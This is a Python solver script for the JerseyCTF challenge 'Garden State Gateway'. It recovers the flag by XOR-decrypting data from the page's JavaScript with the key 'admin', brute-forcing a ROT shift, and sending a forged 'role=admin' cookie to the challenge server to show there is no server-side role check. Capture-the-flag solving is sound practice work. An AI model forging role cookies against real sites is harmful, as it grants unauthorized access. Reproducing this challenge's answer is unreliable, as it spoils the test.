#!/usr/bin/env python3
"""
CTF Solver: Garden State Gateway - JerseyCTF
Challenge: Cookie-based role manipulation + XOR + ROT13
Author: solver script

Vulnerability Chain:
1. Role stored in client-side cookie (no server validation)
2. Flag XOR-encrypted with key = role value ("admin")
3. Result ROT13-encoded
"""

import requests

TARGET = "http://garden-state-gateway.aws.jerseyctf.com/"

# ─── STEP 1: XOR Decrypt (from JS source) ────────────────────────────────────
def xor_decrypt(enc: list, key: str) -> str:
    return ''.join(chr(enc[i] ^ ord(key[i % len(key)])) for i in range(len(enc)))

# ─── STEP 2: ROT-N Brute Force ───────────────────────────────────────────────
def rot(s: str, n: int) -> str:
    result = ''
    for c in s:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            result += chr((ord(c) - base + n) % 26 + base)
        else:
            result += c
    return result

def find_flag_rot(s: str) -> str:
    for n in range(1, 26):
        candidate = rot(s, n)
        if 'jctf{' in candidate.lower():
            return candidate, n
    return None, None

# ─── STEP 3: Verify via HTTP (cookie manipulation) ───────────────────────────
def verify_via_http():
    print("[*] Sending request with Cookie: role=admin ...")
    try:
        r = requests.get(TARGET, cookies={"role": "admin"}, timeout=10)
        print(f"    Status : {r.status_code}")
        print(f"    Headers: {dict(r.headers)}\n")
        # Flag logic is client-side JS, so HTTP won't return plaintext flag
        # but we confirm server accepts the cookie without redirect/block
        if r.status_code == 200:
            print("    [+] Server returned 200 — no server-side role validation confirmed.")
        return r.status_code
    except Exception as e:
        print(f"    [!] HTTP request failed: {e}")
        return None

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    print("=" * 60)
    print("  Garden State Gateway — CTF Solver")
    print("=" * 60)

    # Encrypted data from JS source
    enc = [22,20,10,26,21,21,80,10,90,4,85,8,50,25,94,81,28,92,90,19]
    xor_key = "admin"

    print(f"\n[1] XOR Decrypt")
    print(f"    Key      : {xor_key!r}")
    print(f"    Encoded  : {enc}")
    xored = xor_decrypt(enc, xor_key)
    print(f"    After XOR: {xored}")

    print(f"\n[2] ROT-N Brute Force")
    flag, shift = find_flag_rot(xored)
    if flag:
        print(f"    Shift found : ROT+{shift}")
        print(f"    FLAG        : {flag}")
    else:
        print("    [!] ROT brute force failed — check XOR key")

    print(f"\n[3] HTTP Verification (cookie manipulation)")
    verify_via_http()

    print("\n" + "=" * 60)
    if flag:
        print(f"  ✓  FINAL FLAG: {flag}")
    print("=" * 60)

if __name__ == "__main__":
    main()
